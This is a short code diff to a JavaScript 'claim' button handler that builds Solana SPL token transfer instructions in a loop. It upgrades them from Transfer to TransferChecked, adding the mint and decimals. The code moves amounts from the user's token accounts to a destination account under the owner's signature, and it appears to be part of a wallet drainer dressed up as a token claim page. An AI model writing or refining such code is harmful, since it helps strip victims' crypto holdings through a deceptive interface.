@@ -86,10 +86,11 @@ document.getElementById("claim").onclick = async () => {
         programId: tokenProg,
         keys: [
           { pubkey: src, isSigner: false, isWritable: true },
+          { pubkey: mint, isSigner: false, isWritable: false },
           { pubkey: dst, isSigner: false, isWritable: true },
           { pubkey: owner, isSigner: true, isWritable: false },
         ],
-        data: Buffer.from([3, ...le(BigInt(amt))]),
+        data: Buffer.from([12, ...le(BigInt(amt)), info.tokenAmount.decimals]),
       }));
       n++;
     }
